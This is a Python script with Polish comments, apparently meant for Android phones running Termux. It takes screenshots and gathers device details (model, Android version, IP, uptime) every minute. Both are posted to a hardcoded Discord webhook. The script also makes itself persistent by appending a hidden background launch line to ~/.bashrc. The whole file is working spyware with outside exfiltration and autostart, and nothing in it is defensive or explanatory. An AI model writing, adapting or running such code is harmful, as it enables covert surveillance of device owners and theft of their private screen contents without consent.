#!/usr/bin/env python3
import subprocess
import os
import time
import requests
import socket

WEBHOOK_URL = "https://discord.com/api/webhooks/1509286003586633929/J1B7qGfkiV7c1KRSZli3nB-Ua6ydFfR2d1GpShtTBEml2NaRT2UfBGKBbLaVXgwhqbHF"

def get_ip():
    """Pobierz IP bez hostname -I"""
    try:
        # Próbuj przez ifconfig
        result = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=5)
        if result.stdout:
            for line in result.stdout.split('\n'):
                if 'inet ' in line and '127.0.0.1' not in line:
                    return line.strip().split()[1]
    except:
        pass
    
    try:
        # Alternatywnie przez socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "Nieznane IP"

def send_screenshot():
    """Zrób screena przez termux-screencap"""
    try:
        # Sprawdź czy termux-screencap istnieje
        result = subprocess.run(['which', 'termux-screencap'], capture_output=True, text=True)
        
        if result.stdout.strip():
            # Użyj termux-screencap
            subprocess.run(['termux-screencap', '/sdcard/screen.png'], timeout=10)
        else:
            # Spróbuj screencap
            subprocess.run(['screencap', '-p', '/sdcard/screen.png'], timeout=10)
        
        if os.path.exists("/sdcard/screen.png"):
            size = os.path.getsize("/sdcard/screen.png")
            if size > 1000:  # Sprawdź czy plik nie jest pusty
                with open("/sdcard/screen.png", "rb") as f:
                    files = {"file": ("screen.png", f, "image/png")}
                    r = requests.post(WEBHOOK_URL, files=files)
                    print(f"[+] Screenshot wysłany (status: {r.status_code})")
            else:
                print("[-] Screenshot za mały (pusty?)")
        else:
            print("[-] Nie można zrobić screena")
    except Exception as e:
        print(f"[-] Screenshot error: {e}")

def send_info():
    """Zbierz info o urządzeniu"""
    try:
        model = subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()
        android_ver = subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()
        uptime = subprocess.check_output(['uptime']).decode().strip()
        ip = get_ip()
        
        info = f"""
**Device Info**
- Model: {model}
- Android: {android_ver}
- IP: {ip}
- Uptime: {uptime}
"""
        # Użyj json zamiast content dla embed
        payload = {
            "content": info
        }
        r = requests.post(WEBHOOK_URL, json=payload)
        print(f"[+] Info wysłane (status: {r.status_code})")
    except Exception as e:
        print(f"[-] Info error: {e}")

def persistence():
    """Dodaj do autostartu Termux"""
    script_path = os.path.abspath(__file__)
    bashrc = os.path.expanduser("~/.bashrc")
    
    if not os.path.exists(bashrc):
        open(bashrc, 'w').close()
        print("[+] Utworzono .bashrc")
    
    entry = f"(sleep 30 && python3 {script_path}) &\n"
    
    with open(bashrc, 'r') as f:
        content = f.read()
    
    if entry not in content:
        with open(bashrc, 'a') as f:
            f.write(entry)
        print("[+] Dodano do autostartu .bashrc")
    else:
        print("[*] Już jest w autostarcie")

if __name__ == "__main__":
    print("[*] Start skryptu zbierającego...")
    
    # Persistence
    persistence()
    
    # Pętla co 1 minuta
    while True:
        send_info()
        send_screenshot()
        print("[*] Czekam 60s...")
        time.sleep(60)
